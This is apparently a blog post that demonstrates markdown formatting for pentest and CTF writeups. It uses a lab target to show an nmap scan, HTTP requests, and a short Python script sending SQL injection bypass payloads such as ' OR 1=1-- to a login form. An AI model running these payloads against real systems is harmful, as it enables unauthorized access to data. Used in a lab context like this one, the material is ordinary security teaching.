+++
date = '2026-04-24T11:11:59+02:00'
title = 'Markdown demo — offsec edition'
summary = "A demo article covering most of the markdown features useful for writing offsec writeups: multi-language code blocks, tables, task lists, quotes, images, links, footnotes, and embedded interactive content."
+++

This article is a **visual reference** to test the blog's formatting. It covers most markdown elements useful when writing pentest or CTF *writeups*.

## Engagement tracking

A checklist kept close during an engagement:

- [x] Passive reconnaissance
- [x] Port scanning
- [ ] Service enumeration
- [ ] Exploitation
- [ ] Post-exploitation
- [ ] Final report

## Common attack surfaces

| Port  | Service | Typical tool     | Note                          |
|-------|---------|------------------|-------------------------------|
| 21    | FTP     | `hydra`, `ftp`   | Check anonymous login         |
| 22    | SSH     | `hydra`, `ssh`   | Banner version → known CVEs   |
| 80    | HTTP    | `burp`, `ffuf`   | Directory fuzzing by default  |
| 443   | HTTPS   | `burp`, `sslyze` | Certificate, weak ciphers     |
| 445   | SMB     | `smbclient`      | Null session, open shares     |

## Reconnaissance

### Initial port scan

Quick scan to identify exposed services:

```bash
nmap -sV -sC -oA scans/initial 10.10.10.42
```

The flags:

1. `-sV` — version detection
2. `-sC` — default NSE scripts
3. `-oA` — output in all three formats (nmap, gnmap, xml)

### Manual inspection

For an HTTP service, always start with `curl` before firing up Burp:

```http
GET / HTTP/1.1
Host: target.htb
User-Agent: Mozilla/5.0
Accept: */*
```

An interesting response might return:

```http
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
Set-Cookie: PHPSESSID=abc123; HttpOnly
```

> **Note:** a verbose `Server` header or an `X-Powered-By` often leaks the stack, pointing exploitation straight at known CVEs for that specific version.

## Exploitation

### Typical payload

Quick SQLi enumeration in Python:

```python
import requests

URL = "https://target.htb/search"
PAYLOADS = ["' OR 1=1--", "') OR ('1'='1", "admin'--"]

for p in PAYLOADS:
    r = requests.post(URL, data={"q": p}, timeout=5)
    if "admin" in r.text.lower():
        print(f"[+] Bypass via: {p}")
        break
```

### Exfiltrated data sample

```json
{
  "users": [
    {"id": 1, "username": "admin", "role": "superuser"},
    {"id": 2, "username": "carlos", "role": "user"}
  ]
}
```

### Observed configuration

```yaml
database:
  host: localhost
  user: root
  password: "changeme123"   # ← interesting
  port: 3306
```

## Capture and evidence

![POST request captured in Burp Repeater](test-image.jpg)

## Embedded demo

A shortcode can embed a custom HTML/JS demo co-located in the article's bundle:

{{< test-post/anim-bouncing-ball >}}

## Inline styling

- **bold** for emphasis
- *italic* for nuance
- ~~strikethrough~~ for outdated info
- `inline code` for a command, variable name, or header

Footnote[^1] to clarify a point without breaking the flow.

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- See also the [About](/en/about/) page

---

## Kill chain

Plain code block for an ASCII summary:

```
Reconnaissance
  └─ services identified
       └─ vulnerable version found
            └─ suitable public exploit
                 └─ shell obtained
                      └─ privesc → root
```

[^1]: Example of a note detached from the main paragraph. Useful for details that would weigh down the reading flow.
